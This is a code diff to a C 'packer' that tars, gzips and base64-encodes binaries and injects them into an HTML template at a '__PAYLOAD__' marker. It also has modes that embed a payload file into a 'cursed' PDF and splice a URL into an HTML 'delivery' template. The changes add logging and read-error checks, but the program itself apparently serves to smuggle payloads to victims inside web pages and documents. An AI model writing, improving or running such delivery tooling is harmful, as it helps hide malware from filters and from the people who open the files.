@@ -8,6 +8,7 @@
 #include "base64encoder/b64e.h"
 #include "cursedhelpers.h"
 #include "base64encoder/b64tbl.h"
+#include "cursedhelpers.h"
 
 #ifdef BUILD_PACKER
 
@@ -185,7 +186,7 @@ void (*cursed_log_callback)(const char* msg) = packer_internal_log;
 void pack_tar_header(FILE* f, const char* name, size_t size) {
     unsigned char header[512];
     memset(header, 0, 512);
-    strncpy((char*)header, name, 100);
+    cursed_strncpy((char*)header, name, 100);
     sprintf((char*)header + 124, "%011lo", (unsigned long)size);
     memcpy(header + 257, "ustar", 5);
     unsigned int sum = 0; int i;
@@ -205,10 +206,13 @@ int main(int argc, char** argv) {
     size_t b64_payload_sz = 0, b64_final_sz = 0, r;
     long tpl_sz, url_sz, f_bsize, f_rem, f_blocks, p_bsize, p_rem, p_blocks;
     int i;
+    LOG_V("Starting packing process...\n");
 
     /* --- MODE: PDF GENERATION --- */
     /* Usage: packer -pdf <out.pdf> <payload.txt> */
     if (argc >= 4 && strcmp(argv[1], "-pdf") == 0) {
+        LOG_V("PDF MODE...\n");
+
         fUrl = fopen(argv[3], "rb");
         if (!fUrl) {
             fprintf(stderr, "Error: Could not open payload file %s\n", argv[3]);
@@ -216,7 +220,13 @@ int main(int argc, char** argv) {
         }
         fseek(fUrl, 0, SEEK_END); url_sz = ftell(fUrl); rewind(fUrl);
         url_buf = malloc(url_sz + 1);
-        fread(url_buf, 1, url_sz, fUrl); url_buf[url_sz] = '\0';
+        if(!fread(url_buf, 1, url_sz, fUrl)) {
+            fprintf(stderr, "Error: Could not read payload file %s\n", argv[3]);
+            free(url_buf);
+            fclose(fUrl);
+            return 1;
+        }
+        url_buf[url_sz] = '\0';
         fclose(fUrl);
 
         generate_cursed_pdf(argv[2], url_buf);
@@ -228,6 +238,7 @@ int main(int argc, char** argv) {
     /* --- MODE: HTML DELIVERY PIPE --- */
     /* Usage: packer -delivery <tpl.html> <url.txt> */
     if (argc >= 4 && strcmp(argv[1], "-delivery") == 0) {
+        LOG_V("DELIVERY MODE...\n");
         fTpl = fopen(argv[2], "rb");
         fUrl = fopen(argv[3], "rb");
         if (!fTpl || !fUrl) {
@@ -237,7 +248,14 @@ int main(int argc, char** argv) {
 
         fseek(fTpl, 0, SEEK_END); tpl_sz = ftell(fTpl); rewind(fTpl);
         tpl_buf = malloc(tpl_sz + 1);
-        fread(tpl_buf, 1, tpl_sz, fTpl); tpl_buf[tpl_sz] = '\0';
+        if (!fread(tpl_buf, 1, tpl_sz, fTpl)) {
+            fprintf(stderr, "Error: Could not read template file %s\n", argv[2]);
+            free(tpl_buf);
+            fclose(fTpl);
+            fclose(fUrl);
+            return 1;
+        }
+        tpl_buf[tpl_sz] = '\0';
         fclose(fTpl);
 
         marker_pos = strstr(tpl_buf, "{{CONTENT_OF_URL_TXT}}");
@@ -265,7 +283,7 @@ int main(int argc, char** argv) {
         fprintf(stderr, "  %s -pdf <out.pdf> <url.txt>\n", argv[0]);
         return 1;
     }
-
+    LOG_V("Starting packing process...\n");
     /* 1. ARCHIVE BINARIES TO TAR */
     tar_f = fopen(temp_tar, "wb");
     if (!tar_f) return 1;
@@ -281,26 +299,34 @@ int main(int argc, char** argv) {
         if (padding) { unsigned char p[512] = {0}; fwrite(p, 1, padding, tar_f); }
         fclose(src);
     }
+    LOG_V("Packed to TAR...\n");
     unsigned char eoa[1024] = {0}; fwrite(eoa, 1, 1024, tar_f);
     fclose(tar_f);
+    LOG_V("Wrote TAR file...");
 
     /* 2. GZIP THE TAR */
     if (write_gzip_from_file(temp_tar, &bData) == (uint32_t)-1) return 1;
     bitarray_flush(&bData);
-
+    LOG_V("Packed to GZIP...\n");
     /* 3. BASE64 ENCODE (INNER PAYLOAD) */
     local_getb64size((long)bData.used, &p_bsize, &p_rem, &p_blocks);
     b64_payload = malloc(p_bsize);
     b64_encode(bData.data, bData.used, b64_payload, &b64_payload_sz);
-
+    LOG_V("Packed to BASE64...\n");
     /* 4. TEMPLATE INJECTION */
     fTpl = fopen(argv[1], "rb");
     if (!fTpl) return 1;
     fseek(fTpl, 0, SEEK_END); tpl_sz = ftell(fTpl); rewind(fTpl);
     tpl_buf = malloc(tpl_sz + 1);
-    fread(tpl_buf, 1, tpl_sz, fTpl); tpl_buf[tpl_sz] = '\0';
+    if(!fread(tpl_buf, 1, tpl_sz, fTpl)) {
+        fprintf(stderr, "Error: Could not read template file %s\n", argv[1]);
+        free(tpl_buf);
+        fclose(fTpl);
+        return 1;
+    }
+    tpl_buf[tpl_sz] = '\0';
     fclose(fTpl);
-
+    LOG_V("Read template file...\n");
     marker_pos = strstr(tpl_buf, "__PAYLOAD__");
     if (!marker_pos) return 1;
 
